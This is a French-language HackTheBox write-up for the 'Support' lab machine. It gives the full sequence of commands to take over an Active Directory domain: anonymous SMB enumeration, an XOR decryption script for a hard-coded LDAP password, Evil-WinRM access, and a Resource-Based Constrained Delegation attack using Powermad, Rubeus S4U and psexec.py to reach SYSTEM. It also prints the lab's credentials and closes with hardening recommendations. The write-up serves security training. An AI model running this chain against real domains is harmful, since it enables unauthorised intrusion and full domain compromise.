---
layout: post
title: "Support - HackTheBox WriteUp"
date: 2025-10-18
categories: [CTF, HackTheBox, WriteUp]
tags: [Windows, SMB, LDAP, ReverseEngineering, ActiveDirectory, BloodHound, RBCD, PrivEsc, WinRM, Kerberos]
difficulty: Easy
platform: HackTheBox
author: Aubin SABY
lang: fr
permalink: /fr/blog/2022/12/14/support-htb-writeup/
excerpt: "Machine Windows Active Directory avec partage SMB anonyme. Reverse engineering d'un binaire .NET pour extraire des credentials LDAP, puis exploitation RBCD via BloodHound pour compromission complète du domaine."
---

<div class="bg-gradient-to-r from-green-500/10 to-cyan-500/10 p-10 rounded-xl mb-12 border-l-4 border-green-500 shadow-lg">
    <div class="flex flex-col md:flex-row items-start md:items-center justify-between mb-8 gap-6">
        <div class="flex-1">
            <h2 class="text-4xl md:text-5xl font-bold text-green-500 mb-3">
                <i class="fas fa-cube mr-3"></i>Support
            </h2>
            <p class="text-gray-700 dark:text-gray-300 text-lg md:text-xl">
                Active Directory RBCD Attack via BloodHound Analysis
            </p>
        </div>
        <div class="flex gap-3">
            <span class="px-5 py-2 bg-green-500 text-white rounded-lg text-sm font-semibold shadow-md">
                <i class="fas fa-circle text-xs mr-1"></i>Easy
            </span>
            <span class="px-5 py-2 bg-blue-600 text-white rounded-lg text-sm font-semibold shadow-md">
                <i class="fab fa-windows mr-1"></i>Windows
            </span>
        </div>
    </div>

    <div class="grid grid-cols-2 md:grid-cols-4 gap-6 mt-6">
        <div class="flex items-center gap-3">
            <div class="text-green-500 text-xl">
                <i class="fas fa-calendar"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">Date</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">2025-10-18</div>
            </div>
        </div>

        <div class="flex items-center gap-3">
            <div class="text-blue-500 text-xl">
                <i class="fas fa-network-wired"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">IP</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">10.129.178.26</div>
            </div>
        </div>

        <div class="flex items-center gap-3">
            <div class="text-purple-500 text-xl">
                <i class="fas fa-shield-alt"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">OS</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">Windows Server</div>
            </div>
        </div>

        <div class="flex items-center gap-3">
            <div class="text-amber-500 text-xl">
                <i class="fas fa-star"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">Points</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">30</div>
            </div>
        </div>
    </div>
</div>


## 🎯 Synopsis

**Support** est une machine <span class="text-highlight-green">**Windows de difficulté facile**</span> mettant en œuvre un environnement <span class="text-highlight-red">**Active Directory**</span>.

Un <span class="text-highlight-blue">**partage SMB anonyme**</span> révèle un binaire .NET capable de se connecter à un serveur LDAP. Par <span class="text-highlight-purple">**ingénierie inverse**</span> ou analyse réseau, le mot de passe du compte LDAP est découvert et permet d'énumérer les utilisateurs. Le compte `support` contient son propre mot de passe dans l'attribut `info`, menant à une <span class="text-highlight-green">**connexion WinRM**</span>. Grâce à l'analyse <span class="text-highlight-orange">**BloodHound**</span>, on découvre que le groupe *Shared Support Accounts* possède des privilèges <span class="text-highlight-red">**GenericAll**</span> sur le contrôleur de domaine, ouvrant la voie à une <span class="text-highlight-purple">**Resource-Based Constrained Delegation (RBCD)**</span> et une compromission complète du domaine.

<div class="grid md:grid-cols-2 gap-6 my-4">
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-portfolio-violet">
        <h3 class="text-2xl font-bold text-portfolio-violet mb-4">
            <i class="fas fa-brain mr-2"></i>Compétences requises
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Connaissances de base Windows</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Principes fondamentaux Active Directory</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Compréhension LDAP et SMB</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Notions de base en reverse engineering</li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-cyan-500">
        <h3 class="text-2xl font-bold text-cyan-500 mb-4">
            <i class="fas fa-rocket mr-2"></i>Compétences acquises
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Accès SMB anonyme et énumération</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Décompilation .NET avec ILSpy</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Requêtes LDAP et énumération AD</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Analyse BloodHound pour cartographie des privilèges</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Exploitation RBCD Attack pour shell SYSTEM</li>
        </ul>
    </div>
</div>


## 🔍 Phase 1 — Reconnaissance initiale

### Scan de ports complet

Scan approfondi pour identifier les services exposés :

```bash
nmap -sC -sV -Pn 10.129.178.26
```

<div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg my-4">
    <h4 class="text-xl font-bold mb-4 text-portfolio-violet flex items-center">
        <i class="fas fa-search mr-2"></i>Résultats du scan
    </h4>
    <div class="space-y-3">
        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl text-blue-500">
                <i class="fas fa-folder-open"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-blue-600 dark:text-blue-400">Port 445/TCP - SMB</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">Microsoft-DS (partages réseau)</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Potentiel accès anonyme</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
            <div class="text-3xl text-green-500">
                <i class="fas fa-address-book"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-green-600 dark:text-green-400">Ports 389/636 - LDAP/LDAPS</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">Service d'annuaire Active Directory</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Point d'énumération critique</div>
            </div>
        </div>
    </div>
</div>

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-lightbulb mr-2 text-cyan-500"></i>
        <strong>Analyse :</strong> Système Windows, probablement contrôleur de domaine Active Directory.
    </p>
</div>


## 📁 Phase 2 — Énumération SMB

### Listing des partages

```bash
smbclient -L \\\\10.129.178.26\\
```

Partage accessible :

```
support-tools
```

Téléchargement du fichier suspect :

```bash
smbclient \\\\10.129.178.26\\support-tools
get UserInfo.exe.zip
exit
unzip UserInfo.exe.zip
file UserInfo.exe
```

Application .NET identifiée.


## 🧠 Phase 3 — Reverse Engineering

### Décompilation avec ILSpy

```bash
wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip
unzip Linux.x64.Release.zip
cd artifacts/linux-x64
./ILSpy
```

Code source décompilé révèle :

```csharp
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
private static byte[] key = Encoding.ASCII.GetBytes("armando");
```

### Déchiffrement Python

```python
import base64
from itertools import cycle

enc_password = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = b"armando"

res = ''
for e, k in zip(enc_password, cycle(key)):
    res += chr(e ^ k ^ 223)

print(res)
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold">
        <i class="fas fa-key mr-2 text-green-500"></i>
        Mot de passe LDAP : <code>nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</code>
    </p>
</div>


## 🧩 Phase 4 — Connexion LDAP

Configuration hosts :

```bash
echo '10.129.178.26 support.htb' | sudo tee -a /etc/hosts
```

Connexion LDAP :

```bash
ldapsearch -h support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "*"
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        Connexion LDAP réussie ! Énumération des objets Active Directory possible.
    </p>
</div>


## 🧍 Phase 5 — Découverte du compte support

Dans CN=Users, l'objet support contient :

```
info: Ironside47pleasure40Watchful
memberOf: Remote Management Users
```

<div class="bg-amber-100 dark:bg-amber-900/20 border-l-4 border-amber-500 p-4 my-4 rounded-r-lg">
    <p class="text-amber-800 dark:text-amber-200">
        <i class="fas fa-exclamation-triangle mr-2 text-amber-500"></i>
        <strong>Mot de passe en clair trouvé !</strong> Le groupe Remote Management Users permet la connexion WinRM.
    </p>
</div>


## 💻 Phase 6 — Accès initial WinRM

Connexion :

```bash
evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-terminal mr-2 text-green-500"></i>
        Shell obtenu en tant que support@support.htb !
    </p>
</div>

Flag utilisateur :

```powershell
type C:\Users\Support\Desktop\user.txt
```


## 🧭 Phase 7 — Énumération du domaine

Lister le domaine :

```powershell
Get-ADDomain
```

Groupes de l'utilisateur :

```powershell
whoami /groups
```

Résultat notable :

```
Shared Support Accounts (groupe non standard)
```

<div class="bg-amber-100 dark:bg-amber-900/20 border-l-4 border-amber-500 p-4 my-4 rounded-r-lg">
    <p class="text-amber-800 dark:text-amber-200">
        <i class="fas fa-search mr-2 text-amber-500"></i>
        <strong>Hypothèse :</strong> Ce groupe personnalisé détient potentiellement des privilèges élevés sur le domaine.
    </p>
</div>


## 🕸️ Phase 8 — Analyse BloodHound

### Démarrage de Neo4j et BloodHound

```bash
sudo neo4j start
./BloodHound-linux-x64/BloodHound
```

### Collecte de données

Dans Evil-WinRM :

```powershell
cd C:\Windows\Temp
upload SharpHound.exe
.\SharpHound.exe
download *.zip
```

Importer dans BloodHound et marquer SUPPORT@SUPPORT.HTB comme "Owned".

### Résultat de l'analyse

<div class="bg-red-50 dark:bg-red-900/20 p-6 rounded-xl border-l-4 border-red-500 my-4">
    <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-3 flex items-center">
        <i class="fas fa-crown mr-2"></i>Privilège critique découvert
    </h4>
    <p class="text-gray-700 dark:text-gray-300 mb-2">
        Le groupe <strong>Shared Support Accounts</strong> possède <span class="text-highlight-red">GenericAll</span> sur le contrôleur de domaine DC.SUPPORT.HTB
    </p>
    <p class="text-sm text-gray-600 dark:text-gray-400">
        Cette permission permet une attaque RBCD (Resource-Based Constrained Delegation) pour obtenir un shell SYSTEM.
    </p>
</div>


## ⚙️ Phase 9 — Exploitation RBCD

### Vérifier le quota machine

```powershell
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
```

Résultat : 10 (n'importe quel utilisateur authentifié peut créer jusqu'à 10 machines).

### Importer PowerView

```powershell
upload PowerView.ps1
. ./PowerView.ps1
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
```

### Créer une fausse machine

```powershell
upload Powermad.ps1
. ./Powermad.ps1
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
```

Vérification :

```powershell
Get-ADComputer -Identity FAKE-COMP01
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        Machine FAKE-COMP01 créée avec succès !
    </p>
</div>

### Configurer la délégation

```powershell
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
```

### S4U Attack avec Rubeus

Hash RC4 :

```powershell
upload Rubeus.exe
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
```

Exécution :

```powershell
.\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-ticket-alt mr-2 text-green-500"></i>
        Ticket Kerberos pour Administrator généré et injecté !
    </p>
</div>


## 👑 Phase 10 — Shell SYSTEM

Conversion et utilisation du ticket :

```bash
base64 -d ticket.kirbi.b64 > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache
KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-xl">
        <i class="fas fa-crown mr-2 text-amber-500"></i>
        NT AUTHORITY\SYSTEM obtenu !
    </p>
</div>

Flag root :

```
C:\Users\Administrator\Desktop\root.txt
```

<div class="bg-gradient-to-r from-amber-500/10 to-yellow-500/10 p-6 rounded-xl border-l-4 border-amber-500 my-4">
    <div class="flex items-center gap-4">
        <div class="text-5xl text-amber-500">
            <i class="fas fa-trophy"></i>
        </div>
        <div class="flex-1">
            <h4 class="text-2xl font-bold text-amber-600 dark:text-amber-400 mb-2">Machine Pwned!</h4>
            <p class="text-gray-700 dark:text-gray-300">
                <i class="fas fa-flag text-green-500 mr-2"></i><strong>User flag :</strong> C:\Users\Support\Desktop\user.txt<br>
                <i class="fas fa-flag text-red-500 mr-2"></i><strong>Root flag :</strong> C:\Users\Administrator\Desktop\root.txt
            </p>
        </div>
    </div>
</div>


## 📋 Phase 11 — Recommandations

<div class="grid md:grid-cols-2 gap-6 my-4">
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-red-500">
        <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-4 flex items-center">
            <i class="fas fa-folder-open mr-2"></i>SMB & LDAP
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Supprimer l'accès SMB anonyme</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Ne jamais stocker de mots de passe en clair dans les attributs LDAP</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Activer la journalisation LDAP & Kerberos</span>
            </li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-blue-500">
        <h4 class="text-xl font-bold text-blue-600 dark:text-blue-400 mb-4 flex items-center">
            <i class="fas fa-shield-alt mr-2"></i>Active Directory
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Restreindre les privilèges GenericAll</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Contrôler ms-DS-MachineAccountQuota</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Segmentation des privilèges AD</span>
            </li>
        </ul>
    </div>
</div>

---

## 📝 Récapitulatif des commandes

### 🔍 Phase 1 : Reconnaissance & Accès Initial (Linux)

```bash
# 1. Scan réseau
nmap -sC -sV -Pn 10.129.178.26

# 2. Énumération SMB
smbclient -L \\\\10.129.178.26\\
smbclient \\\\10.129.178.26\\support-tools
# → Télécharger UserInfo.exe.zip

# 3. Déchiffrement du mot de passe LDAP (après reverse engineering)
python3 decrypt.py
# → Mot de passe : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

# 4. Requête LDAP pour énumérer les utilisateurs
ldapsearch -h support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "*"
# → Trouve le mot de passe de 'support' dans l'attribut 'info'

# 5. Connexion WinRM avec l'utilisateur support
evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
```

### 🔐 Phase 2 : Énumération AD (PowerShell sur la cible)

```powershell
# 1. Vérifier le domaine et les groupes
Get-ADDomain
whoami /groups
# → Membre de 'Shared Support Accounts'

# 2. Vérifier le quota de création de machines
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
# → Quota = 10 (on peut créer des machines)
```

### 🕸️ Phase 3 : Collecte BloodHound (PowerShell)

```powershell
# 1. Se placer dans un dossier avec droits d'écriture
cd C:\Windows\Temp

# 2. Upload et exécution de SharpHound
upload SharpHound.exe
.\SharpHound.exe

# 3. Télécharger les résultats
download *.zip
```

### ⚙️ Phase 4 : RBCD Attack (PowerShell)

```powershell
# 1. Upload et import de PowerView
upload PowerView.ps1
. ./PowerView.ps1

# 2. Vérifier les délégations actuelles
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity

# 3. Créer une fausse machine avec Powermad
upload Powermad.ps1
. ./Powermad.ps1
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)

# 4. Vérifier la création
Get-ADComputer -Identity FAKE-COMP01

# 5. Configurer la délégation sur le DC
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
```

### 🎫 Phase 5 : Génération du ticket Kerberos (PowerShell)

```powershell
# 1. Upload Rubeus
upload Rubeus.exe

# 2. Générer le hash RC4
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
# → RC4: 58A478135A93AC3BF058A5EA0E8FDB71

# 3. Exécuter l'attaque S4U pour usurper Administrator
.\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
# → Copier le ticket base64 généré
```

### 👑 Phase 6 : Shell SYSTEM (Linux)

```bash
# 1. Conversion du ticket Kerberos
base64 -d ticket.kirbi.b64 > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache

# 2. Utilisation du ticket pour obtenir un shell Administrator
export KRB5CCNAME=ticket.ccache
psexec.py support.htb/administrator@dc.support.htb -k -no-pass
# → NT AUTHORITY\SYSTEM obtenu !
```

---

## 🔗 Chaîne d'attaque résumée

<div class="bg-white dark:bg-dark-navbar px-6 py-5 rounded-xl shadow-lg my-8">
    <h3 class="text-2xl font-bold text-portfolio-violet mb-4 flex items-center">
        <i class="fas fa-project-diagram mr-3"></i>Parcours d'attaque complet
    </h3>
    <div class="space-y-4">
        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl font-bold text-blue-500 mt-1">1</div>
            <div class="flex-1">
                <div class="font-bold text-blue-600 dark:text-blue-400">Reconnaissance et accès SMB</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">Nmap → SMB anonyme → UserInfo.exe.zip</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
            <div class="text-3xl font-bold text-green-500 mt-1">2</div>
            <div class="flex-1">
                <div class="font-bold text-green-600 dark:text-green-400">Reverse Engineering</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">ILSpy → Déchiffrement XOR → Credentials LDAP</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-purple-50 dark:bg-purple-900/20 rounded-lg border-l-4 border-purple-500">
            <div class="text-3xl font-bold text-purple-500 mt-1">3</div>
            <div class="flex-1">
                <div class="font-bold text-purple-600 dark:text-purple-400">Énumération LDAP et WinRM</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">ldapsearch → Attribut info → WinRM support</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-red-50 dark:bg-red-900/20 rounded-lg border-l-4 border-red-500">
            <div class="text-3xl font-bold text-red-500 mt-1">4</div>
            <div class="flex-1">
                <div class="font-bold text-red-600 dark:text-red-400">Escalade de privilèges</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">BloodHound → GenericAll → RBCD Attack → SYSTEM</div>
            </div>
        </div>
    </div>
</div>

---

## 🏷️ Tags & Références

<div class="flex flex-wrap gap-2 my-4" style="line-height: 1.5;">
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(59, 130, 246, 0.1); color: #3b82f6; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">Windows</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(34, 197, 94, 0.1); color: #22c55e; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">SMB</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(239, 68, 68, 0.1); color: #ef4444; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">LDAP</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(168, 85, 247, 0.1); color: #a855f7; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">ReverseEngineering</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(245, 158, 11, 0.1); color: #f59e0b; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">ActiveDirectory</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(99, 102, 241, 0.1); color: #6366f1; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">BloodHound</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(236, 72, 153, 0.1); color: #ec4899; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">RBCD</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(14, 165, 233, 0.1); color: #0ea5e9; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">PrivEsc</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(107, 114, 128, 0.1); color: #6b7280; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">WinRM</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(6, 182, 212, 0.1); color: #06b6d4; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">Kerberos</span>
</div>

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
    <h4 class="text-lg font-bold mb-4 text-portfolio-violet flex items-center">
        <i class="fas fa-link mr-2"></i>Références utiles
    </h4>
    <ul class="space-y-2 text-gray-700 dark:text-gray-300">
        <li>
            <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                Resource-Based Constrained Delegation Explained
            </a>
        </li>
        <li>
            <a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                BloodHound - Active Directory Attack Path Mapping
            </a>
        </li>
        <li>
            <a href="https://github.com/icsharpcode/ILSpy" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                ILSpy - .NET Decompiler
            </a>
        </li>
    </ul>
</div>

---

<div class="text-center my-12">
    <a href="{{ site.baseurl }}/fr/blog/" class="inline-block bg-gradient-to-r from-portfolio-violet to-cyan-500 hover:from-portfolio-violet-light hover:to-cyan-600 text-white font-bold py-4 px-10 rounded-lg shadow-lg transition duration-300 transform hover:scale-105">
        <i class="fas fa-arrow-left mr-2"></i>Retour au blog
    </a>
</div>
